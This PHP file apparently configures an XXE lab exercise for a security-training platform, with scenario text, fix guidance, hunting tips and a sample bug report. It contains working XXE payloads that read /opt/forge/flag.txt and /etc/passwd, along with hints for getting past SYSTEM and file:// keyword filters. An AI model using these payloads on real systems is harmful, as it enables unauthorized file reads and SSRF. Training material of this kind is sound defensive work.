<?php
return [
    'order' => 90,
    'title' => 'Product Import: XXE',
    'category' => 'XXE',
    'summary' => 'The bulk importer parses an XML document you upload.',
    'severity' => 'High',
    'cwe' => 'CWE-611',
    'difficulty' => 'Advanced',
    'scenario' => 'The importer reads a product name from your XML. The parser resolves external entities, so a crafted DOCTYPE can make it read a local file into that field. Read /opt/forge/flag.txt. POST the XML as the request body.',
    'feature' => '/labs/xxe-import/run',
    'request' => [
        'method' => 'POST', 'path' => '/labs/xxe-import/run', 'headers' => 'Content-Type: application/xml',
        'body' => "<?xml version=\"1.0\"?>\n<!DOCTYPE product [\n  <!ENTITY xxe SYSTEM \"file:///opt/forge/flag.txt\">\n]>\n<product><name>&xxe;</name></product>",
    ],
    'payloads' => ['<!ENTITY xxe SYSTEM "file:///opt/forge/flag.txt">', '<!ENTITY xxe PUBLIC "x" "file:///opt/forge/flag.txt">', '<!ENTITY xxe SYSTEM "/opt/forge/flag.txt">', '<!ENTITY xxe SYSTEM "file:///etc/passwd">'],
    'hints' => [
        'Define an external entity in the DOCTYPE and reference it inside <name>. The parser replaces &xxe; with the file contents, which the importer then echoes.',
        'At Medium the word SYSTEM is filtered. XML also declares external identifiers with PUBLIC: <!ENTITY xxe PUBLIC "x" "file:///opt/forge/flag.txt">.',
        'At High the file:// scheme is filtered. An external id can be a bare absolute path with no scheme: SYSTEM "/opt/forge/flag.txt".',
    ],
    'debrief' => 'The XML parser resolved an external entity you defined, pulling a server file into a field the importer echoed back. Blocking a keyword or a scheme fails because XML offers equivalents (PUBLIC for SYSTEM, scheme-less paths). The Secure level parses without loading DTDs or substituting entities, so the DOCTYPE is inert.',
    'root_cause' => 'An XML parser is configured to resolve external entities on untrusted input.',
    'fix' => 'Disable DTD loading and entity substitution (do not pass LIBXML_NOENT/LIBXML_DTDLOAD; use LIBXML_NONET). On modern libxml the safe behavior is the default; keep it that way and reject documents containing a DOCTYPE.',
    'hunting' => 'Any XML entry point: SOAP, SAML, RSS, SVG, DOCX/XLSX, sitemap, config import. Send a DOCTYPE with a SYSTEM entity pointing at file:///etc/passwd or an out-of-band URL. Blind XXE uses parameter entities to exfiltrate over the network. In source, look for loadXML/simplexml with LIBXML_NOENT or old libxml.',
    'report' => "Title: XML external entity injection in product importer\nSeverity: High (CVSS 3.1 8.6)\nWeakness: CWE-611\n\nSteps to reproduce:\n1. POST XML with a DOCTYPE defining an external entity for file:///etc/passwd.\n2. The file contents are returned in the parsed product name.\n\nImpact: Arbitrary file read; SSRF and blind exfiltration via external entities.\n\nRemediation: Disable DTD/entity processing; reject DOCTYPEs.",
];
